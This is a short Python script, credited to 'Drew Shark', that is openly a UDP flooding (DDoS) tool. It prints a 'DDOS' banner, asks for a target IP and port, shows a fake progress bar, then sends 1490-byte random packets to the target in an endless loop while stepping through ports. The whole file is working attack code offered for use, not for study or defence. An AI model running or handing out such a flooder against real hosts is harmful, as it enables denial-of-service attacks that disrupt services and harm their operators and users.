# ./Author : DREW SHARK
import os
import random
import sys
import time
import socket
from datetime import datetime


#Colour
yellow='\033[93m'
gren='\033[92m'
cyan='\033[96m'
pink='\033[95m'
red='\033[91m'
b='\033[1m'

#
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day

month = now.month
year = now.year


def logo():
	os.system('clear')
	print(pink+red+b+'''
	           █▀▄ █▀▄ █▀█ █▀  
	           █▄▀ █▄▀ █▄█ ▄█  
	
	  『D』『D』『O』『S』 『D』Ũ『N』『G』  '''+b+red+pink)
	




#
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

#
def first(self):
	logo()
	print("")
	print(pink+b+"Author     : Drew Shark"+b+pink)
	print("Facebook :   Nguyen Quang Dung")
	print("YouTube    : DREW SHARK")
	print("")
	
	#
	ip = input(gren+b+"Target IP  : "+b+gren)
	port = int(input("Enter Port  : "))
	print("")
	print(cyan+b+"[+]--                            [+] 0%"+b+cyan)
	time.sleep(2)
	print("[+]--xxxxxxx>                    [+] 25%")
	time.sleep(2)
	print("[+]--xxxxxxxxxxxx>               [+] 50%")
	time.sleep(3)
	print("[+]--xxxxxxxxxxxxxxxxx>          [+] 75%")
	time.sleep(2)
	print(cyan+b+"[+]--xxxxxxxxxxxxxxxxxxxxxx>     [+] 100%"+b+cyan)
	time.sleep(2)
	os.system('clear')
	sent = 0
	
	while True:
		sock.sendto(bytes, (ip, port))
		sent = sent + 100
		port = port + 100
		
		print(f"HACODE :- sent %s packet to %s througj port:%s"%(sent,ip,port))

first('f')
